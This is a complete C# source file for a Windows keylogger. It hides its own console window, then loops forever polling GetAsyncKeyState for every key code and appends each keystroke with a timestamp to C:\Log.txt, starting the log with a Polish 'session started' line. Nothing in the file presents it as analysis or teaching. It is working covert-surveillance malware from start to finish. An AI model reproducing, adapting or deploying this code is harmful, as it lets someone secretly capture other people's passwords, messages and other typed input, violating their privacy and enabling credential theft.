using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;

class Keylog
{

    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    static void Main()
    {
        DateTime time;
        KeysConverter convert = new KeysConverter();
        const int SW_HIDE = 0;
        //const int SW_SHOW = 5;
        var handle = GetConsoleWindow();

        ShowWindow(handle, SW_HIDE);
        //ShowWindow(handle, SW_SHOW);
        time = DateTime.Now;
        String path = (@"C:\Log.txt");
        if (!File.Exists(path))
        {
             using (StreamWriter sw = File.CreateText(path))
            {
                sw.WriteLine("Sesja rozpoczeta :"+ time.ToString());
            }
        }

        while (true)
        {

            // Thread.Sleep(10);

            for (Int32 i = 0; i < 255; i++)
            {
                int key = GetAsyncKeyState(i);
                if (key == 1 || key == -32767)
                {
                    time = DateTime.Now;
                    string text = convert.ConvertToString(i);
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.WriteLine(text+"          "+time.ToString());
                    }
                    break;
                }
            }
        }
    }
}